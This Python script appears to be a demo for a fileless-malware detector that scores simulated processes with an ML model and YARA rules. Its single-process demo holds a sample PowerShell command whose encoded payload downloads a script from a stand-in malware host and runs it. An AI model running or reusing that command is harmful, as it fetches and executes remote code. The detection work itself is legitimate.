"""
demo_scan.py
Interactive live scan demo — simulates scanning a running system's process list.
Shows real-time per-process detection with risk scoring and alerts.
Requires main.py to have been run first (model must be saved).
"""

import sys
import os
import time
import random
import warnings
warnings.filterwarnings('ignore')

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

try:
    from rich.console import Console
    from rich.panel import Panel
    from rich.table import Table
    from rich.live import Live
    from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn
    from rich.text import Text
    from rich import box
    RICH = True
except ImportError:
    RICH = False
    print("[WARNING] 'rich' not installed. Install with: pip install rich")

from src.data_generator import generate_benign_sample, generate_malicious_sample
from src.ml_models import load_model
from src.yara_engine import YaraEngine
from src.hybrid_detector import HybridDetector, RiskLevel

import numpy as np

console = Console() if RICH else None

RISK_COLORS = {
    'CRITICAL': 'bold red',
    'HIGH': 'yellow',
    'MEDIUM': 'cyan',
    'LOW': 'green',
    'SAFE': 'dim green',
}

RISK_ICONS = {
    'CRITICAL': '🔴',
    'HIGH': '🟠',
    'MEDIUM': '🟡',
    'LOW': '🟢',
    'SAFE': '✅',
}


def print_alert(result):
    if not RICH:
        print(f"  [{result.risk_level.value}] {result.process_name} (PID {result.pid})"
              f" Score={result.hybrid_score:.4f}")
        return

    rl = result.risk_level.value
    color = RISK_COLORS.get(rl, 'white')
    icon = RISK_ICONS.get(rl, '?')

    if result.is_malicious:
        panel_content = (
            f"[{color}]{icon} {rl} THREAT DETECTED[/{color}]\n\n"
            f"[white]Process:[/white] [yellow]{result.process_name}[/yellow]  "
            f"[dim]PID: {result.pid}[/dim]\n"
            f"[white]Hybrid Score:[/white] [bold {color}]{result.hybrid_score:.4f}[/bold {color}]  "
            f"[white]ML Prob:[/white] {result.ml_probability:.4f}  "
            f"[white]YARA Hits:[/white] {result.yara_hits}\n\n"
        )
        if result.attack_indicators:
            panel_content += "[dim]Attack Indicators:[/dim]\n"
            for ind in result.attack_indicators[:4]:
                panel_content += f"  [red]►[/red] {ind}\n"

        panel_content += f"\n[dim italic]{result.recommendation}[/dim italic]"

        console.print(Panel(
            panel_content,
            title=f"[bold {color}]⚠ MALWARE ALERT[/bold {color}]",
            border_style=color,
            expand=False,
        ))
    else:
        console.print(
            f"  [dim]{icon}  {result.process_name:<25} PID {result.pid:<6} "
            f"Score={result.hybrid_score:.3f}  [{color}]SAFE[/{color}][/dim]"
        )


def generate_live_process_stream(n_total=40):
    """Generate a mixed stream of benign and malicious processes for the live scan demo."""
    rng = np.random.default_rng(seed=int(time.time()))
    processes = []

    # Inject ~25% malicious
    attack_types = ['process_hollowing', 'lolbin_abuse', 'dll_injection', 'ps_encoded', 'wmi_exec']
    n_malicious = max(1, n_total // 4)
    n_benign = n_total - n_malicious

    for _ in range(n_benign):
        processes.append(generate_benign_sample(rng))

    for _ in range(n_malicious):
        atype = random.choice(attack_types)
        processes.append(generate_malicious_sample(rng, atype))

    random.shuffle(processes)
    return processes


def run_live_scan():
    if RICH:
        console.print(Panel.fit(
            "[bold cyan]Live System Scan — Fileless Malware Detection[/bold cyan]\n"
            "[white]Simulating real-time process memory analysis with Hybrid Detector[/white]\n"
            "[dim]Powered by: Volatility + YARA + Random Forest Ensemble[/dim]",
            border_style='cyan',
        ))
    else:
        print("=" * 55)
        print("  Live System Scan — Fileless Malware Detection")
        print("=" * 55)

    # Load model
    try:
        model_bundle = load_model()
    except FileNotFoundError:
        if RICH:
            console.print("[bold red]ERROR:[/bold red] No trained model found. Run [cyan]python main.py[/cyan] first.")
        else:
            print("ERROR: No model found. Run main.py first.")
        sys.exit(1)

    engine = YaraEngine()
    detector = HybridDetector(model_bundle, engine, ml_weight=0.6, yara_weight=0.4)

    processes = generate_live_process_stream(n_total=40)

    if RICH:
        console.print(f"\n[bold]Scanning [cyan]{len(processes)}[/cyan] processes...[/bold]\n")
    else:
        print(f"\nScanning {len(processes)} processes...\n")

    detections = []
    critical_count = 0
    high_count = 0

    for i, proc in enumerate(processes):
        time.sleep(0.08)  # Simulate real-time scanning delay

        result = detector.detect(proc)
        detections.append(result)

        if RICH:
            if result.risk_level in (RiskLevel.CRITICAL, RiskLevel.HIGH):
                print_alert(result)
                if result.risk_level == RiskLevel.CRITICAL:
                    critical_count += 1
                else:
                    high_count += 1
            else:
                print_alert(result)
        else:
            status = 'THREAT' if result.is_malicious else 'safe'
            print(f"  [{i+1:02d}] {result.process_name:<22} {status}  score={result.hybrid_score:.3f}")

    # Final summary
    malicious = [r for r in detections if r.is_malicious]
    benign = [r for r in detections if not r.is_malicious]

    if RICH:
        console.print("\n")
        summary_tbl = Table(title="Scan Complete — Summary Report", box=box.DOUBLE, border_style='cyan')
        summary_tbl.add_column("Category", style='bold white')
        summary_tbl.add_column("Count", justify='right')
        summary_tbl.add_column("Details")
        summary_tbl.add_row("Total Processes", str(len(detections)), "")
        summary_tbl.add_row("SAFE / Benign", f"[green]{len(benign)}[/green]", "No threats found")
        summary_tbl.add_row("CRITICAL Threats", f"[bold red]{critical_count}[/bold red]", "Immediate action required")
        summary_tbl.add_row("HIGH Risk", f"[yellow]{high_count}[/yellow]", "Alert SOC team")
        summary_tbl.add_row("Total Malicious", f"[red]{len(malicious)}[/red]",
                            f"{len(malicious)/len(detections)*100:.0f}% detection rate")
        console.print(summary_tbl)

        if malicious:
            console.print("\n[bold red]⚠  Malicious Processes Detected — Immediate Investigation Required[/bold red]")
            for r in sorted(malicious, key=lambda x: x.hybrid_score, reverse=True)[:5]:
                console.print(
                    f"  [red]►[/red] [yellow]{r.process_name}[/yellow] (PID {r.pid})"
                    f" — Score: [bold red]{r.hybrid_score:.4f}[/bold red]"
                    f" — [{RISK_COLORS.get(r.risk_level.value,'white')}]{r.risk_level.value}[/]"
                )
    else:
        print(f"\nSCAN SUMMARY: Total={len(detections)} Malicious={len(malicious)} Benign={len(benign)}")


def demo_single_process():
    """Demo: analyze one specific suspicious process interactively."""
    if RICH:
        console.print(Panel.fit(
            "[bold yellow]Single Process Deep Analysis[/bold yellow]\n"
            "[dim]Analyzing a suspicious PowerShell process with encoded command[/dim]",
            border_style='yellow',
        ))

    try:
        model_bundle = load_model()
    except FileNotFoundError:
        print("Run main.py first to train the model.")
        return

    engine = YaraEngine()
    detector = HybridDetector(model_bundle, engine)

    suspicious_process = {
        'process_name': 'powershell.exe',
        'pid': 4832,
        'ppid': 6124,
        'cmd_line': 'powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAY3QgTmV0LldlYkNsaWVudDsgJGNsaWVudC5Eb3dubG9hZFN0cmluZygnaHR0cDovL21hbHdhcmUuY29tL3NoZWxsLnBzMScpIHwgSUVY',
        'cmd_line_length': 280,
        'num_threads': 4,
        'num_handles': 89,
        'working_set_mb': 42.5,
        'private_bytes_mb': 38.2,
        'session_id': 1,
        'is_signed': 1,
        'num_loaded_dlls': 28,
        'has_network_conn': 1,
        'num_network_conns': 3,
        'writable_exec_sections': 2,
        'private_memory_ratio': 0.72,
        'heap_executable': 1,
        'vad_count': 87,
        'suspicious_parent': 1,
        'process_hollowing': 0,
        'dll_injection': 0,
        'reflective_load': 0,
        'encoded_powershell': 1,
        'lolbin_usage': 1,
        'wmi_execution': 0,
        'unusual_thread_start': 1,
        'yara_hits': 3,
        'memory_anomaly_score': 0.84,
    }

    if RICH:
        console.print("\n[bold]Process Under Analysis:[/bold]")
        proc_tbl = Table(box=box.SIMPLE, show_header=False)
        proc_tbl.add_column("Key", style='dim')
        proc_tbl.add_column("Value", style='yellow')
        for k, v in list(suspicious_process.items())[:10]:
            proc_tbl.add_row(k, str(v))
        console.print(proc_tbl)

    result = detector.detect(suspicious_process)
    print_alert(result)


if __name__ == '__main__':
    if len(sys.argv) > 1 and sys.argv[1] == 'single':
        demo_single_process()
    else:
        run_live_scan()
